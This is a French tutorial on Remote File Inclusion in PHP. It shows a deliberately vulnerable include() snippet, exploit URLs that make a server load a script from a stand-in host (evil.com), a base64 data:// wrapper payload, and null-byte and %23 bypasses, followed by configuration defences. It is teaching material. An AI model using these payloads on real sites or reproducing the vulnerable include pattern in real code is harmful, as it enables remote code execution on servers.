# Remote File Inclusion : RFI 

## 1.Presentation 

Explication de la faille + fonctionnement du logiciel


Le RFI est une faille permettant à un attaquant d'inclure un fichier distant. Cette vulnérabilité est basée
sur des fonctions telles que include ou encore require (pour le php).
D'autres langages comme le Javascript et l'ASP sont aussi impactés.

Les conséquences sont multiples :

* L'exécution de code sur le serveur web
* L'exécution de code sur le côté client comme le JavaScript peut conduire à d'autres attaques comme Cross-site scripting (XSS)
* Déni de service (DoS)
* Le vol de données / Manipulation de données

Ces types d’attaques sont de moins en moins présentes dans les applications qui sont basées majoritairement sur des framework robustes. 
Mais ces vulnérabilités existent bel et bien, il est donc intéressant de connaître des méthodes d’attaques pour en mesurer la gravité.

Un exemple de code vulnérable :

```PHP
<?php
$incfile = $_GET["file"];
include($incfile.".php");
?>
```

Dans cette exemple le nom du fichier est extrait depuis la requete HTTP et aucunes validations ne lui est appliquées.

La détection de cette faille est relativement simple car si on inclut un fichier inexistant on se retrouve avec une erreur qui peut ressembler à :

```

Warning: include(test.php): failed to open stream: No such file or directory in /test/index.php on line 18 
Warning: include(): Failed opening 'test.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /test/index.php on line 18 

```
## 2.Exploitation


Le but de l'exploitation est d'inclure un fichier distant sur le serveur.

__2.1 Méthode 1 : RFI basique__

On passe en paramètre une url pointant vers un script externe : 

<http://localhost/rfi.php?page=http://evil.com/exploit.php>

Ce script sera récupéré par l’application et exécuté puis rendu dans la page résultante.



__2.2 Méthode 2 : DATA URI__

Nous allons utiliser le wrapper PHP DATA pour exécuter du code php.

Tout d'abord nous allons encoder notre script en base64

Soit grâce à un commande bash :
```BASH
echo -n "<?php echo 'vulnerable'; ?>" | base64 

PD9waHAgZWNobyAndnVsbmVyYWJsZSc7ID8+
```

Soit grâce au site : <https://www.base64encode.org/|Base64Encode>

Pour l'exploitation :

<http://localhost/rfi.php?page=data://text/plain;base64,notre_script_encodé_en_base64>

On obtient :

<http://localhost/rfi.php?page=data://text/plain;base64,PD9waHAgZWNobyAndnVsbmVyYWJsZSc7ID8+>

Cela aura pour effet d'afficher "vulnérable" sur le site.
Je vous laisse imaginer des scripts plus poussés pour effectuer des actions plus évoluées.


__2.3 Méthode 3 : Bypass d'extensions auto ajoutées__

Il est possible que lorsque d'un essaie d'inclure un script distant le site ajoute automatiquement une extension (.php / .text /.js ...)

Il y a deux façons pour éviter cela :

Première solution : Le null byte (CF  faille LFI)
 

<http://localhost/rfi.php?page=http://wikisecu.fr/exploit.php%00>

Seconde solution (fonctionne uniquement sur certains sites) : Le caractère #

Le caractère # une fois encodé donne %23


<http://localhost/rfi.php?page=http://wikisecu.fr/exploit.php%23>



**3.Comment se protéger**

Il est possible de désactiver le support en passant la valeur des directives “allow_url_open” et “allow_url_include” à “Off”.

Vous pouvez bloquer l’utilisation des wrappers en installant l’extension Suhosin pour PHP (sauf si “allow_url_include” = “On”).

Source :

<http://blog.clever-age.com/fr/2014/10/21/owasp-local-remote-file-inclusion-lfi-rfi/>

<https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion|OWASP>

<https://fr.wikipedia.org/wiki/Remote_File_Inclusion|Wikipedia>